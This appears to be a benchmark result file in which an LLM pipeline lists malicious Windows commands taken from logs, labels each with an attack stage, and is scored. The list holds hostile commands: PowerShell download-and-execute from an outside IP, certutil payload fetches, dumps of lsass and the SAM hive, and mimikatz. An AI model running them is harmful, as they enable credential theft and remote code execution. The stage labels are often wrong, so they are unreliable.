@@ -1,0 +1,312 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C \"cscript.exe  /e:VBScript.Encode T1059.007.vbs\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C \"netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "lazagne1.exe browsers",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=c:",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/atomicredteam.hta C:\\tmp",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "systeminfo",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg /batteryreport",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net share",
+        "stage": "Discovery"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\Desktop\\shell\\",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "calc.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\msxslxmlfile.xml",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1220\\bin\\msxsl.exe C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1548.002\\src\\T1548.002.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1548.002\\src\\T1548.002.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs > $env:TEMP\\T1059.005.out.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "t1547.001 -TestNumbers 1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "invokeservice.dll",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Invokeservice.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C net group \"domain admins\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netstat -an",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mkdir C:%HOME PATH%\\Desktop\\T1022  & echo ipconfig /all > C:%HOME PATH%\\Desktop\\T1022\\T1022.txt & 7z.exe a -tzip T1022.zip C:%HOME PATH%\\Desktop\\T1022",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sc query type=service > %TEMP%\\T1119_1.txt & doskey /history > %TEMP%\\T1119_2.txt & wmic process list > %TEMP%\\T1119_3.txt & tree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::SAM exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "c:\\Windows\\system32\\cmd.exe /c netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "consent.exe 8308 288 0000024DDEC54440",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "winlogon.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill.exe /f /im wordpad.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill.exe /f /im sangforcat.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "consent.exe 8308 288 0000024DDEC54D00",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C start powershell&REM \\\\system32\\\\cleanmgr.exe /autoclean /d C:",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell \"",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "googleupdate.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C del /f /q Test.hta",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "This is a complex cyberattack involving multiple tactics, techniques, and procedures (TTPs) employed by an advanced threat actor. The attackers compromised the target organization's network using initial access methods such as phishing, drive-by downloads, and exploitation of software vulnerabilities. They then established persistent presence through various means like scheduled tasks, registry modifications, and DLL sideloading. To evade detection, they used techniques like code obfuscation, anti-debugging, and hijacking legitimate processes. Additionally, they performed lateral movement by creating new administrator accounts, accessing shares, and exploiting Windows features. Their ultimate objective appeared to be stealing sensitive information, including Domain Administrator credentials and domain trust relationships.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87717,
+      "completion_tokens": 5657,
+      "total_tokens": 93374,
+      "wall_clock_s": 83.593,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.18461538461538463,
+      "recall": 0.6666666666666666,
+      "f1": 0.28915662650602414,
+      "tp": 12,
+      "fp": 53,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.3333333333333333,
+      "f1": 0.125,
+      "tp": 5,
+      "fp": 60,
+      "fn": 10,
+      "recall_partial": 0.42857142857142855
+    },
+    "hallucination_rate": 0.08620689655172414,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 87717,
+      "completion_tokens": 5657,
+      "total_tokens": 93374,
+      "wall_clock_s": 83.593,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
